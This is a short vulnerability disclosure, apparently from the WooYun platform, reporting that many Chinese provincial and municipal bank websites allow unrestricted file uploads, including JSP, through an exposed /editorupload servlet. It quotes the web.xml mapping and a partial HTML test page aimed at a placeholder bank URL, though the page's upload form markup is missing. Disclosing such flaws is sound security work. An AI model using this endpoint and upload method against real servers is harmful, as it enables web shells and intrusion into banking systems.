简要描述：

一批省级市级银行任意类型文件上传，可上jsp （好吧，我承认我是来刷rank的）

详细说明：

1)见： WooYun: 一批中小银行任意文件下载

2)从web.xml中看到这么一段上传的配置：

<!--编辑器上传-->

  <servlet>

        <servlet-name>editorUpload</servlet-name>

        <servlet-class>ehm.module.editor.upload.UploadServlet</servlet-class>

    </servlet>

    <servlet-mapping>

        <servlet-name>editorUpload</servlet-name>

        <url-pattern>/editorupload</url-pattern>

    </servlet-mapping>

   <servlet-mapping>

        <servlet-name>editorUpload</servlet-name>

        <url-pattern>/site067/editorupload</url-pattern>

    </servlet-mapping>



3)测试:

<html>

<title>upload test</title>

<script>

function uploadFile(){	document.uploadform.action=document.getElementById("actionUrl").value;

	document.uploadform.submit();

}

</script>

<body>

<input id="actionUrl" type="text" size="45" value="http://mybank.com/editorupload">

</body>

</html>
